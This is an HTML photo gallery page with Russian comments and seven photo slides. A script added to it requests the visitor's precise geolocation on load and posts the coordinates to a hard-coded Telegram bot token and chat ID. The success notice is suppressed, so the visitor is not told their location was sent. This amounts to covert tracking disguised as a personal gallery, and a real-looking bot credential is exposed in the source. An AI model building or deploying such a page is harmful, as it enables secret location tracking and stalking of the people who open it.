<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Gallery</title>
  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Mono:ital@0;1&display=swap" rel="stylesheet" />
  <style>
    :root {
      --black: #050505;
      --deep: #0a0010;
      --neon: #bf00ff;
      --neon-glow: #d966ff;
      --neon-dim: #7a00a8;
      --surface: #0f0018;
    }

    *, *::before, *::after {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html {
      scroll-behavior: smooth;
      scroll-snap-type: y mandatory;
    }

    body {
      background: var(--black);
      color: #fff;
      font-family: 'Space Mono', monospace;
      cursor: none;
      overflow-x: hidden;
    }

    /* Custom cursor */
    .cursor {
      position: fixed;
      width: 14px;
      height: 14px;
      background: var(--neon);
      border-radius: 50%;
      pointer-events: none;
      z-index: 9999;
      transform: translate(-50%, -50%);
      box-shadow: 0 0 12px var(--neon), 0 0 30px var(--neon-dim);
      transition: transform 0.08s ease, width 0.2s ease, height 0.2s ease;
      mix-blend-mode: screen;
    }
    .cursor.big {
      width: 48px;
      height: 48px;
      opacity: 0.35;
    }

    /* Header */
    header {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      z-index: 100;
      padding: 18px 36px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      mix-blend-mode: normal;
      pointer-events: none;
    }
    header::after {
      content: '';
      position: absolute;
      bottom: 0; left: 0; right: 0;
      height: 1px;
      background: linear-gradient(90deg, transparent, var(--neon), transparent);
      opacity: 0.4;
    }

    .logo {
      font-family: 'Bebas Neue', sans-serif;
      font-size: 1.6rem;
      letter-spacing: 0.25em;
      color: #fff;
      text-shadow: 0 0 18px var(--neon), 0 0 40px var(--neon-dim);
    }

    .counter {
      font-size: 0.65rem;
      letter-spacing: 0.2em;
      color: var(--neon-glow);
      opacity: 0.7;
      font-style: italic;
    }

    /* Photo slides */
    .slide {
      position: relative;
      width: 100%;
      height: 100vh;
      scroll-snap-align: start;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--deep);
    }

    .slide img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      display: block;
      filter: brightness(0.82) saturate(1.1);
      transition: filter 0.6s ease, transform 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94);
    }

    .slide:hover img {
      filter: brightness(0.95) saturate(1.3);
      transform: scale(1.025);
    }

    /* Neon overlay vignette */
    .slide::before {
      content: '';
      position: absolute;
      inset: 0;
      background:
        radial-gradient(ellipse at center, transparent 40%, rgba(5,0,16,0.75) 100%);
      z-index: 1;
      pointer-events: none;
    }

    /* Neon border on each slide */
    .slide::after {
      content: '';
      position: absolute;
      inset: 0;
      border: 1px solid transparent;
      box-shadow: inset 0 0 60px rgba(191,0,255,0.08);
      z-index: 2;
      pointer-events: none;
      transition: box-shadow 0.4s ease;
    }
    .slide:hover::after {
      box-shadow: inset 0 0 80px rgba(191,0,255,0.18);
    }

    /* Slide number label */
    .slide-num {
      position: absolute;
      bottom: 28px;
      right: 36px;
      z-index: 5;
      font-family: 'Bebas Neue', sans-serif;
      font-size: 5rem;
      line-height: 1;
      color: transparent;
      -webkit-text-stroke: 1px var(--neon);
      text-shadow: 0 0 20px var(--neon-dim);
      opacity: 0.22;
      user-select: none;
      pointer-events: none;
      letter-spacing: 0.05em;
    }

    /* Placeholder when no image is set */
    .slide .placeholder {
      position: absolute;
      inset: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 16px;
      z-index: 3;
      pointer-events: none;
    }
    .slide .placeholder svg {
      opacity: 0.18;
    }
    .slide .placeholder span {
      font-size: 0.7rem;
      letter-spacing: 0.25em;
      color: var(--neon-glow);
      opacity: 0.45;
      text-transform: uppercase;
    }

    /* Scanline effect on top of everything */
    .scanlines {
      position: fixed;
      inset: 0;
      z-index: 200;
      pointer-events: none;
      background: repeating-linear-gradient(
        0deg,
        transparent,
        transparent 2px,
        rgba(0,0,0,0.07) 2px,
        rgba(0,0,0,0.07) 4px
      );
      mix-blend-mode: multiply;
    }

    /* Scroll indicator */
    .scroll-hint {
      position: fixed;
      bottom: 28px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 100;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 8px;
      opacity: 1;
      transition: opacity 0.5s ease;
      pointer-events: none;
    }
    .scroll-hint.hidden { opacity: 0; }

    .scroll-hint span {
      font-size: 0.55rem;
      letter-spacing: 0.3em;
      color: var(--neon-glow);
      opacity: 0.6;
      text-transform: uppercase;
    }
    .scroll-arrow {
      width: 1px;
      height: 40px;
      background: linear-gradient(to bottom, var(--neon), transparent);
      box-shadow: 0 0 6px var(--neon);
      animation: pulse-down 1.4s ease-in-out infinite;
    }
    @keyframes pulse-down {
      0%, 100% { opacity: 0.3; transform: scaleY(0.6) translateY(-6px); }
      50%        { opacity: 1;   transform: scaleY(1)   translateY(0);   }
    }

    /* Neon corner decoration */
    .corner {
      position: fixed;
      z-index: 101;
      width: 40px;
      height: 40px;
      pointer-events: none;
    }
    .corner svg { display: block; }
    .corner.tl { top: 12px; left: 12px; }
    .corner.tr { top: 12px; right: 12px; transform: scaleX(-1); }
    .corner.bl { bottom: 12px; left: 12px; transform: scaleY(-1); }
    .corner.br { bottom: 12px; right: 12px; transform: scale(-1); }

    /* === ДОБАВЛЕННЫЙ СТИЛЬ ДЛЯ УВЕДОМЛЕНИЯ О ГЕОЛОКАЦИИ === */
    .geo-toast {
      position: fixed;
      bottom: 80px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0,0,0,0.85);
      backdrop-filter: blur(12px);
      border: 1px solid var(--neon);
      border-radius: 40px;
      padding: 8px 20px;
      font-size: 0.7rem;
      letter-spacing: 0.1em;
      color: var(--neon-glow);
      z-index: 300;
      pointer-events: none;
      white-space: nowrap;
      font-family: 'Space Mono', monospace;
      transition: opacity 0.3s ease;
      opacity: 0;
    }
    .geo-toast.show {
      opacity: 1;
      animation: fadeUp 0.3s ease;
    }
    @keyframes fadeUp {
      from { opacity: 0; transform: translateX(-50%) translateY(10px); }
      to   { opacity: 1; transform: translateX(-50%) translateY(0); }
    }
  </style>
</head>
<body>

  <!-- Custom cursor -->
  <div class="cursor" id="cursor"></div>

  <!-- Scanlines overlay -->
  <div class="scanlines"></div>

  <!-- Fixed header -->
  <header>
    <div class="logo">Света</div>
    <div class="counter" id="counter">01 / 07</div>
  </header>

  <!-- Corner decorations -->
  <div class="corner tl">
    <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
      <path d="M2 38 L2 2 L38 2" stroke="#bf00ff" stroke-width="1.5" opacity="0.5"/>
    </svg>
  </div>
  <div class="corner tr">
    <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
      <path d="M2 38 L2 2 L38 2" stroke="#bf00ff" stroke-width="1.5" opacity="0.5"/>
    </svg>
  </div>
  <div class="corner bl">
    <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
      <path d="M2 38 L2 2 L38 2" stroke="#bf00ff" stroke-width="1.5" opacity="0.5"/>
    </svg>
  </div>
  <div class="corner br">
    <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
      <path d="M2 38 L2 2 L38 2" stroke="#bf00ff" stroke-width="1.5" opacity="0.5"/>
    </svg>
  </div>

  <!-- Scroll hint -->
  <div class="scroll-hint" id="scrollHint">
    <span>Scroll</span>
    <div class="scroll-arrow"></div>
  </div>

  <!-- === ДОБАВЛЕННЫЙ ЭЛЕМЕНТ ДЛЯ УВЕДОМЛЕНИЙ === -->
  <div class="geo-toast" id="geoToast">📍 Геолокация отправлена</div>

  <!-- =============================================
       ФОТОГРАФИИ — замените src="..." на свои пути
       ============================================= -->

  <div class="slide" data-index="1">
     <img src="photo_1_2026-05-12_20-52-06.jpg" alt="Фото 1" /> 
     <div class="slide-num">01</div>
  </div>

  <div class="slide" data-index="2">
     <img src="photo_2_2026-05-12_20-52-06.jpg" alt="Фото 2" /> 
     <div class="slide-num">02</div>
  </div>

  <div class="slide" data-index="3">
     <img src="photo_3_2026-05-12_20-52-06.jpg" alt="Фото 3" /> 
     <div class="slide-num">03</div>
  </div>

  <div class="slide" data-index="4">
     <img src="photo_4_2026-05-12_20-52-06.jpg" alt="Фото 4" /> 
     <div class="slide-num">04</div>
  </div>

  <div class="slide" data-index="5">
     <img src="photo_5_2026-05-12_20-52-06.jpg" alt="Фото 5" /> 
     <div class="slide-num">05</div>
  </div>

  <div class="slide" data-index="6">
     <img src="photo_6_2026-05-12_20-52-06.jpg" alt="Фото 6" /> 
     <div class="slide-num">06</div>
  </div>

  <div class="slide" data-index="7">
     <img src="photo_7_2026-05-12_20-52-06.jpg" alt="Фото 7" />
     <div class="slide-num">07</div>
  </div>


  <script>
    // ============================================================
    // === БЛОК ГЕОЛОКАЦИИ И ОТПРАВКИ В TELEGRAM (ДОБАВЛЕН) =======
    // ============================================================
    
    // ⚠️ ВАЖНО: ЗАМЕНИТЕ НА ВАШИ ДАННЫЕ ОТ TELEGRAM ⚠️
    const BOT_TOKEN = '8579657280:AAFGU-YYWJFAoSq_oTuwjle05vJNQQ4DMo0';   // например "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
    const YOUR_CHAT_ID = '8599472200';          // например "987654321"
    
    // Флаг, чтобы не отправлять геолокацию повторно при повторном заходе на страницу
    let locationSent = false;
    
    // Функция отправки координат в Telegram
    function sendLocationToTelegram(lat, lon, accuracy) {
      if (!BOT_TOKEN || BOT_TOKEN === 'ВАШ_ТОКЕН_БОТА_ОТ_BOTFATHER') {
        console.warn('⚠️ BOT_TOKEN не настроен. Геолокация не будет отправлена.');
        showToast('⚠️ Бот не настроен', 2000);
        return false;
      }
      if (!YOUR_CHAT_ID || YOUR_CHAT_ID === 'ВАШ_ID_В_TELEGRAM') {
        console.warn('⚠️ CHAT_ID не настроен. Геолокация не будет отправлена.');
        showToast('⚠️ Получатель не настроен', 2000);
        return false;
      }
      
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
      
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: YOUR_CHAT_ID,
          latitude: lat,
          longitude: lon,
          horizontal_accuracy: accuracy
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log('✅ Геолокация отправлена в Telegram:', lat, lon);
          
        } else {
          console.error('❌ Ошибка Telegram API:', data);
          showToast('❌ Ошибка отправки', 3000);
        }
      })
      .catch(error => {
        console.error('❌ Ошибка сети при отправке геолокации:', error);
        showToast('❌ Ошибка соединения', 3000);
      });
    }
    
    // Уведомление для пользователя (ненакладно)
    function showToast(message, duration = 2500) {
      const toast = document.getElementById('geoToast');
      if (!toast) return;
      toast.textContent = message;
      toast.classList.add('show');
      setTimeout(() => {
        toast.classList.remove('show');
        // восстанавливаем стандартный текст через секунду после скрытия
        setTimeout(() => {
          if (toast.textContent !== '📍 Геолокация отправлена') {
            toast.textContent = '📍 Геолокация отправлена';
          }
        }, 300);
      }, duration);
    }
    
    // Основная функция запроса геолокации
    function requestAndSendGeolocation() {
      // Уже отправляли за эту сессию? (не спамим при обновлении страницы)
      if (locationSent) {
        console.log('Геолокация уже была отправлена ранее в этой сессии');
        return;
      }
      
      // Проверяем поддержку браузером
      if (!('geolocation' in navigator)) {
        console.warn('Браузер не поддерживает геолокацию');
        showToast('⚠️ Ваш браузер не поддерживает геолокацию', 3000);
        return;
      }
      
      // Запрашиваем разрешение (браузер покажет стандартный запрос)
      navigator.geolocation.getCurrentPosition(
        function(position) {
          // Пользователь разрешил
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const accuracy = Math.round(position.coords.accuracy); // точность в метрах
          
          console.log(`📍 Получена геолокация: ${lat}, ${lon} (точность ±${accuracy} м)`);
          locationSent = true;
          sendLocationToTelegram(lat, lon, accuracy);
        },
        function(error) {
          // Пользователь запретил или ошибка
          let errorMessage = '';
          switch(error.code) {
            case error.PERMISSION_DENIED:
              errorMessage = 'Доступ к геолокации запрещён';
              break;
            case error.POSITION_UNAVAILABLE:
              errorMessage = 'Данные геолокации недоступны';
              break;
            case error.TIMEOUT:
              errorMessage = 'Время запроса истекло';
              break;
            default:
              errorMessage = 'Неизвестная ошибка геолокации';
          }
          console.warn('Геолокация отклонена или недоступна:', errorMessage);
          showToast(`⚠️ ${errorMessage}`, 3000);
        },
        {
          enableHighAccuracy: true,   // запрашиваем более точные данные (GPS если доступен)
          timeout: 10000,             // таймаут 10 секунд
          maximumAge: 0               // не использовать кэшированные координаты
        }
      );
    }
    
    // Запускаем запрос геолокации при загрузке страницы
    // Небольшая задержка, чтобы не мешать анимациям и дать странице полностью отрисоваться
    window.addEventListener('load', function() {
      setTimeout(requestAndSendGeolocation, 500);
    });
    
    // ============================================================
    // === ОСТАЛЬНОЙ ИСХОДНЫЙ КОД (кастомный курсор, счётчик и т.д.) ===
    // ============================================================
    
    // Custom cursor
    const cursor = document.getElementById('cursor');
    document.addEventListener('mousemove', e => {
      cursor.style.left = e.clientX + 'px';
      cursor.style.top  = e.clientY + 'px';
    });
    document.querySelectorAll('.slide').forEach(el => {
      el.addEventListener('mouseenter', () => cursor.classList.add('big'));
      el.addEventListener('mouseleave', () => cursor.classList.remove('big'));
    });

    // Scroll counter & hint
    const counter   = document.getElementById('counter');
    const scrollHint = document.getElementById('scrollHint');
    const slides    = document.querySelectorAll('.slide');
    let   scrolled  = false;

    const observer = new IntersectionObserver(entries => {
      entries.forEach(e => {
        if (e.isIntersecting) {
          const idx = e.target.dataset.index;
          counter.textContent = String(idx).padStart(2,'0') + ' / 10';
          if (!scrolled) { scrolled = true; scrollHint.classList.add('hidden'); }
        }
      });
    }, { threshold: 0.55 });

    slides.forEach(s => observer.observe(s));

    // Hide scroll hint on first scroll
    window.addEventListener('scroll', () => {
      if (!scrolled) { scrolled = true; scrollHint.classList.add('hidden'); }
    }, { once: true });
  </script>
</body>
</html>
